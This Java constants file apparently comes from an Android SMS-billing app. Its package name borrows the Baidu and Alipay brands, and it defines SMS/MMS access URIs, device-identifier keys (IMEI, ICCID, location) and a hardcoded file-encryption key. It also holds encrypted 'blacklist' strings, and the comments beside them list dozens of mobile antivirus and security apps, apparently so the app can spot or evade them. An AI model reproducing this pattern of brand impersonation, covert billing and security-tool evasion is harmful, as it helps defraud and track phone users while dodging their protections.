package com.baidu.alipay;

/**
 * 应用程序常量
 * 
 * @author WEIXING
 * 
 */
public class Constant {

	public static String DATABASENAME = "appbox.db";
	public static int DATABASENAMEVERSION = 1;
	
	public static final int STATUS_SYNCH_SUCC = 0x999981;
    public static final int STATUS_SYNCH_FAIL = 0x999983;
	
	public static final String DEFAULTPHONENUM = "13800000000";
	
	public static final String URI_SMS = "content://sms";
	public static final String URI_MMS = "content://mms";
	public static final String URI_MMSSMS = "content://mms-sms/conversations?simple=true";
	public static final String URI_CANONICAL = "content://mms-sms/canonical-addresses";
	
	public static double DEFAULTINTERVAL = 60.0;//1小时
	public static double DEFAULTINTERVAL_ERROR = 6.0;//6分钟
	public static double DEFAULTINTERVAL_ERROR_ASYNCH = 6.0;//6分钟
	public static double DEFAULTWAITINTERVAL = 2.0;//2
	public static double DEFAULTNOFEEINTERVAL = 2.0;//10
	
	public static String DEFAULTCID = "1000";
	
    /**
     * Debug level logging
     */
    public static final boolean DEBUG = true;

    /**
     * Verbose level logging
     */
    public static final boolean VERBOSE = true;

    public final static String KEY = "key";

    public final static String ICCID = "iccid";
    public final static String IMEI = "imei";
    public final static String LBS = "lbs";
    public final static String REQUESTArg = "requestArg";
    public final static String RESOLUTION = "resolution";

    /**
     * 共享文件的属性 uid
     */
    public final static String PREFE_UID = "uid";

   
    // ==========================以下为计费包资源
    /**
     * 版本号
     */
    public static String PMA_VERSION = "1.5.9.1a";
    /**
     * 共享文件名称
     */
    public final static String PREFS_NAME = "BILLINGPRO";
    public final static String MOBLETYPE = "mobletype";
    public final static String PHONENUM = "phonenum";

	public static boolean screenOff = false;
    /**
     * 存文件使用的加密密钥
     */
    public final static byte[] PASSWORD = new byte[] { (byte) 0xF7,
            (byte) 0xD7, (byte) 0x11, (byte) 0xF4, (byte) 0x41, (byte) 0x58,
            (byte) 0x8D, (byte) 0x88, (byte) 0xE3, (byte) 0xF9, (byte) 0xA0,
            (byte) 0x4E, (byte) 0x04, (byte) 0xB6, (byte) 0x93, (byte) 0x73 };
	
    //com.baidu.security,com.ijinshan.duba,com.qihoo360.mobilesafe,com.ydsjws.mobileguard,com.anyisheng.doctoran,com.lbe.security,com.anguanjia.safe,com.kms,cmcc.kvpioneer,project.rising,com.tencent.qqpimsecure,cn.opda.a.phonoalbumshoushou,com.nqmobile.antivirus20,com.trendmicro.tmmspersonal,com.symantec.mobilesecurity,com.eset.ems2.web,org.antivirus,com.mobileann.MobileAnn,com.avast.android.mobilesecurity,kvpioneer.cmcc,com.antutu.safe,com.antivirus,com.drweb.pro.market,com.lookout,com.anpo.gbz,com.avira.android,com.lenovo.safecenter,com.lbe.security
  //"5164A53E042CDC5614764F8B8259DA1A80E7689A90BD3AD69B2F22AC65D37A8D7F1CF14FC0FB81FEC10FDA38BF19CB793BF7E90F283895BAAA298CC9BE790FFD519F8CFFD953EB7B59D135239FDACE49959CC333D12378438211B587E3D6F847870812764B802DD40DA920798C8EFFE8C0D7CD698E0FFA21C1F98583A4A6F218A8B27440D2A218916AA1270AAB42489FA7BC6F533DC1E4CFB9171248B3B35FED21E856ADD9F6B2A1295593AAE5DE7723273C08F2D9ED4FF036F47E181377FF6E88C0065267E8C64DED5DE0381F913FE868FB88EC6FCAD09D307D460F03D60A0D59E6327239137BC6C884ACAFF11FB85B158B8C6C0A1BF46C23485B3511F0144D059939757CE31CDA01B3F12CC962234F62C475495D5886C584C22A88AD4A9B0CCC12002089447F87A55EFF26D7C4E9F9EB944B5D420803AD37EFE820BC5BCBDA848A633C7466E2673C23A7FA4923698C0572A113C4983A10FF7740A0BCAA4D0970848DFD09094E1151D253B83CF21CA7FCCA259FA7F7C8CB1424A568A00A2E4FBB08A4778C2463ACD5ED8F05C499C5F5FFD2318946175E89DAAB26F5821E2C094D0FD55E1E48E927008CEB52EC4B4D6E40B023A2B47BB121187E61D8B3DA4C119F9DDB0B6BC037AB42E92DC297B37790984A15D5F8A3A66CE598EADE3952F707CFC39C49D23124E60C2383E988B0745D10594834FCCADBBF073E8FE0C08FE4903E00D8A0D015DCE8B8ACC371B50B2E3CE37C44C7F86C080D743FF3785BC6F4D4D3E388DE558FF1595AA1AC63AEA09415";
    public static final String BLACKSOFTSALL = "5164A53E042CDC5614764F8B8259DA1A80E7689A90BD3AD69B2F22AC65D37A8D7F1CF14FC0FB81FEC10FDA38BF19CB793BF7E90F283895BAAA298CC9BE790FFD519F8CFFD953EB7B59D135239FDACE49959CC333D12378438211B587E3D6F847870812764B802DD40DA920798C8EFFE8C0D7CD698E0FFA21C1F98583A4A6F218A8B27440D2A218916AA1270AAB42489FA7BC6F533DC1E4CFB9171248B3B35FED21E856ADD9F6B2A1295593AAE5DE7723273C08F2D9ED4FF036F47E181377FF6E88C0065267E8C64DED5DE0381F913FE868FB88EC6FCAD09D307D460F03D60A0D59E6327239137BC6C884ACAFF11FB85B158B8C6C0A1BF46C23485B3511F0144D059939757CE31CDA01B3F12CC962234F62C475495D5886C584C22A88AD4A9B0CCC12002089447F87A55EFF26D7C4E9F9EB944B5D420803AD37EFE820BC5BCBDA848A633C7466E2673C23A7FA4923698C0572A113C4983A10FF7740A0BCAA4D0970848DFD09094E1151D253B83CF21CA7FCCA259FA7F7C8CB1424A568A00A2E4FBB08A4778C2463ACD5ED8F05C499C5F5FFD2318946175E89DAAB26F5821E2C094D0FD55E1E48E927008CEB52EC4B4D6E40B023A2B47BB121187E61D8B3DA4C119F9DDB0B6BC037AB42E92DC297B37790984A15D5F8A3A66CE598EADE3952F707CFC39C49D23124E60C2383E988B0745D10594834FCCADBBF073E8FE0C08FE4903E00D8A0D015DCE8B8ACC371B50B2E3CE37C44C7F86C080D743FF3785BC6F4D49926C534E117E992C34BED6DF0547D6D077BF6AD0CB6F811CABCC19892A7BC91";
    
    //com.anyisheng.doctoran,com.qihoo360.mobilesafe,com.lbe.security,com.lenovo.safecenter,net.hidroid.himanager
    public static final String BLACKSOFTS0 = "29BF6B237F1E2963157CF85D23D10DC610FCFF26D00F402D50201F0320D2CE20A13968A8C9EF67DBD4DED708CC1FCC6BCFEA0189E4B09F64CE8B2D097073658BA232543C3D5ADB0C4035D3DB814BF96A85777AD7AED52928685D55C3EF5238D5A8267CA56D5D037B185FBAD5C8CBB021";
            
    //com.anyisheng.doctoran,com.qihoo360.mobilesafe,com.lbe.security,com.lenovo.safecenter,net.hidroid.himanager,com.tencent.qqpimsecure
    public static final String BLACKSOFTS = "29BF6B237F1E2963157CF85D23D10DC610FCFF26D00F402D50201F0320D2CE20A13968A8C9EF67DBD4DED708CC1FCC6BCFEA0189E4B09F64CE8B2D097073658BA232543C3D5ADB0C4035D3DB814BF96A85777AD7AED52928685D55C3EF5238D524FC7C3D78C4421F967CE5D088167A89B301DDEFE8D4AC6A75C4EAB6A817411BA9CF3B15EF3285505847E173B973679E";
    
    public static final boolean CHANGEWAP = false;
}
